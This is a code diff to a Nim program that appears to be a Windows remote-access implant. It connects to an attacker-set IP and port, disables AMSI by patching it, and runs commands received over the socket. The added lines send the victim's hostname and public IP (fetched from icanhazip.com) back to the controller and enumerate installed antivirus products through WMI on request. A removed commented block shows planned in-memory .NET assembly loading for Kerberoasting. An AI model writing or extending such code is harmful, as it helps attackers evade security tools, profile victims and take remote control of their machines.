@@ -8,6 +8,10 @@ import strutils
 import strenc
 import strformat
 import winim/clr
+from zippy import uncompress
+import winim/com
+import nativesockets
+import httpclient
 
 
 
@@ -19,7 +23,6 @@ var port = parseInt(patch_port)
 var client: net.Socket = newSocket()
 client.connect(ip,  Port(port))
 echo "Trying to connect to: ",ip,":", port
-
 
 
 proc inbound_comm(): string =
@@ -43,9 +46,27 @@ else:
   client.send(encode("1"))
 
 
+
+
 os.sleep(5000)
 echo "OS: ", hostOS
 client.send(encode(hostOS))
+
+os.sleep(2000)
+
+var hostname = getHostname()
+echo fmt"Hostname: {hostname}"
+client.send(encode(hostname))
+
+os.sleep(2000)
+
+const source = "http://ipv4.icanhazip.com" # Forces IPv4
+
+var h_client = newHttpClient()
+let response = h_client.getContent(source)
+var result = response.strip()
+echo fmt"Public IP: {result}"
+client.send(encode(result))
 
 
 when defined amd64:
@@ -86,8 +107,15 @@ proc PatchAmsi(): bool =
 when isMainModule:
     var success = PatchAmsi()
     echo fmt"[*] AMSI disabled: {bool(success)}"
+    
 
 
+proc getAv*() : string =
+    let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
+    for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct\n"):
+        result.add($avprod.displayName & "\n")
+    result = result.strip(trailing = true)
+    
 
 while true:
   var message = inbound_comm()
@@ -103,30 +131,9 @@ while true:
     discard
   elif message == "help":
     discard
-  #elif message == "execute-asm":
-    #var asm_byte = inbound_comm()
-    #echo "test"
-    #echo asm_byte
-      
-      #Execute assembly code - need to figure out how to transfer byte code 
-      #[
-      echo "[*] Installed .NET versions"
-      for v in clrVersions():
-          echo fmt"    \--- {v}"
-      echo "\n"
-
-      echo ""
-
-      var assembly = load(buf)
-      dump assembly
-
-
-      var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
-      #assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
-
-      arr = toCLRVariant(["kerberoast"], VT_BSTR) # Actually passing some args
-      assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
-      ]#
+  elif message == "GetAV":
+    var result = getAv()
+    client.send(encode(result))
   else:
     try:
       var command = message
